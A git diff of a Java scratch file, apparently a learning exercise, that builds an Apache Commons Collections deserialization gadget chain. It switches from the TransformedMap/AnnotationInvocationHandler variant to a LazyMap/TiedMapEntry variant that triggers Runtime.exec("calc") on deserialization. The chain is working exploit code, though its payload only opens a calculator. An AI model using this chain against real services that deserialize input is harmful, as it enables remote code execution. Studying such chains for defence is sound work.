@@ -1,9 +1,12 @@
 import com.oracle.webservices.internal.api.databinding.DatabindingMode;
+import com.sun.scenario.animation.shared.TimerReceiver;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InstantiateTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
 import org.apache.commons.collections.map.TransformedMap;
 import org.jetbrains.annotations.Async;
 
@@ -13,9 +16,7 @@ import java.io.FileOutputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.lang.annotation.Target;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
+import java.lang.reflect.*;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.util.HashMap;
@@ -55,24 +56,31 @@ public class TestClass {
 //        Runtime invoke = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}).transform(invokerTransformer1);
 //        new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"calc" }).transform(invoke);
 
+
+
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                 new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                 new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"calc"}),
         };
-        ChainedTransformer chainedTransformer =new ChainedTransformer(transformers);
+        ChainedTransformer chainedTransformer =new ChainedTransformer(transformers);//通过调用Runtime的exec来命令执行
 
         Map map = new HashMap();
-        map.put("enabled","b");
-        Map decorate = TransformedMap.decorate(map, null, chainedTransformer);
 
-        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
-        Constructor declaredConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);//获取器构造方法
-        declaredConstructor.setAccessible(true);
-        Object o = declaredConstructor.newInstance(Addressing.class, decorate);
+        Map decorate = LazyMap.decorate(map,new ConstantTransformer(1));
 
-        serialization(o);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, "aaa");
+
+        HashMap kvHashMap = new HashMap<>();
+        kvHashMap.put(tiedMapEntry,"bbb");
+        decorate.remove("aaa");
+
+        Field clazz = Class.forName("org.apache.commons.collections.map.LazyMap").getDeclaredField("factory");
+        clazz.setAccessible(true);
+        clazz.set(decorate,chainedTransformer);
+
+        serialization(kvHashMap);
         unserialization();
     }
 }
